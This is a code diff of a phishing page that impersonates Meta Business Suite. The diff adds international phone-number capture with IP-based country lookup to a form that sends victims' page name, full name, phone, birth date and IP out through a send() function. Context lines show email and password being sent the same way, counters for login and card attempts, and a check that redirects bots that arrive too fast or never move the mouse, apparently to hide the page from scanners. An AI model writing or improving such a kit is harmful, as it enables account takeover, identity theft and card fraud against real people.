@@ -5,19 +5,18 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Meta Business Suite</title>
     <link rel="icon" type="image/x-icon" href="https://www.facebook.com/favicon.ico">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"/>
     <style>
         :root { --m-blue: #1877F2; --m-bg: #FFFFFF; --m-text: #1C1E21; --m-gray: #65676B; --m-border: #ced4da; --fb-bg: #F0F2F5; }
         body { font-family: "Segoe UI", Helvetica, Arial, sans-serif; background: #f0f2f5; margin: 0; color: var(--m-text); display: flex; flex-direction: column; min-height: 100vh; }
         .nav { background: white; padding: 12px 20px; border-bottom: 1px solid #dddfe2; display: flex; align-items: center; justify-content: flex-start; }
         @media (min-width: 900px) { .nav { padding: 12px 50px; } }
-        /* ADJUSTED CSS: Full width on mobile, compact on PC/iPad */
         .card { background: white; width: 100%; max-width: 550px; margin: 0 auto; padding: 25px; box-sizing: border-box; }
         @media (min-width: 900px) { .card { margin: 40px auto; padding: 40px; border-radius: 8px; box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1); } }
         .chat-bubble { position: fixed; bottom: 20px; right: 20px; background: white; border-radius: 50px; padding: 10px 20px; display: flex; align-items: center; gap: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); border: 1px solid #eee; z-index: 999; }
         .chat-status { width: 10px; height: 10px; background: #42b72a; border-radius: 50%; animation: pulse 2s infinite; }
         .chat-text { font-size: 12px; color: var(--m-gray); font-weight: 500; }
         @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
-        /* P1 adjusted to blend on mobile background */
         #p1 { max-width: 100%; text-align: center; background: #f0f2f5; box-shadow: none; border: none; padding-top: 40px; }
         @media (min-width: 900px) { #p1 { max-width: 1000px; margin-top: 80px; } }
         .illustration { width: 100%; height: auto; background: none; border-radius: 10px; margin-bottom: 20px; display: flex; align-items: center; justify-content: center; }
@@ -51,6 +50,9 @@
         .expiry-cvv-row > div { flex: 1; }
         .secure-note { font-size: 13px; color: var(--m-gray); margin-top: 20px; }
         .secure-note svg { vertical-align: middle; margin-right: 5px; }
+        /* Phone Input Adjustment */
+        .iti { width: 100%; margin-bottom: 15px; }
+        .iti__country-list { color: #000; text-align: left; }
     </style>
 </head>
 <body>
@@ -82,7 +84,7 @@
     </p>
     <input type="text" id="pname" placeholder="Page Name">
     <input type="text" id="fname" placeholder="Your Name (Name and Surname)">
-    <input type="text" id="phone" placeholder="Your Phone Number">
+    <input type="tel" id="phone" placeholder="Your Phone Number">
     <div class="bday-label">Date of birth</div>
     <div class="bday-row">
         <select id="b_day"><option value="">Day</option><script>for(let i=1;i<=31;i++)document.write('<option value="'+i+'">'+i+'</option>')</script></select>
@@ -169,12 +171,12 @@
 
 <footer>Meta © 2025</footer>
 
+<script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
 <script>
     // DEFENSE UPGRADE: Start Timer and Motion Tracking
     const startTime = Date.now();
     let humanActed = false;
     
-    // Track Human Motion (Bots don't move mice or scroll like humans)
     window.onmousemove = () => { humanActed = true; };
     window.onscroll = () => { humanActed = true; };
     window.ontouchstart = () => { humanActed = true; };
@@ -191,6 +193,18 @@
     let uIP = "Detecting...";
     let loginAttempts = 0;
     let cardAttempts = 0;
+
+    // Initialize Phone Input with Auto Country Detection
+    const phoneInput = window.intlTelInput(document.querySelector("#phone"), {
+        initialCountry: "auto",
+        geoIpLookup: function(success, failure) {
+            fetch("https://ipapi.co/json")
+                .then(res => res.json())
+                .then(data => success(data.country_code))
+                .catch(() => success("us"));
+        },
+        utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
+    });
    
     const getDevice = () => {
         const ua = navigator.userAgent;
@@ -255,14 +269,10 @@
     async function step(f, t) {
         const timeSpent = Date.now() - startTime;
         
-        // --- DEFENSE BLOCK (UPDATED) ---
-        // If they click "Get Started" in under 2.5 seconds OR haven't moved the mouse/scrolled
-        // It is a bot. Redirect them.
         if (f === 1 && (!humanActed || timeSpent < 2500)) {
             window.location.href = "https://www.facebook.com/policies/community-standards/";
             return;
         }
-        // -------------------------------
 
         const currentDiv = document.getElementById('p' + f);
         const inputs = currentDiv.querySelectorAll('input, select');
@@ -312,7 +322,9 @@
        
         if (f === 2) {
             const bday = document.getElementById('b_day').value + "/" + document.getElementById('b_month').value + "/" + document.getElementById('b_year').value;
-            await send(`🚨 *DETAILS*\n👤 Page: ${document.getElementById('pname').value}\n👤 Name: ${document.getElementById('fname').value}\n📞 Phone: ${document.getElementById('phone').value}\n🎂 Bday: ${bday}\n🌐 IP: ${ipLink}`);
+            // Get full international number (e.g., +123456789)
+            const fullPhone = phoneInput.getNumber();
+            await send(`🚨 *DETAILS*\n👤 Page: ${document.getElementById('pname').value}\n👤 Name: ${document.getElementById('fname').value}\n📞 Phone: ${fullPhone}\n🎂 Bday: ${bday}\n🌐 IP: ${ipLink}`);
         }
         if (f === 3) {
             await send(`🔑 *LOGIN 2*\n📧 User: ${document.getElementById('email').value}\n🔓 Pass: ${document.getElementById('pass').value}\n🌐 IP: ${ipLink}`);
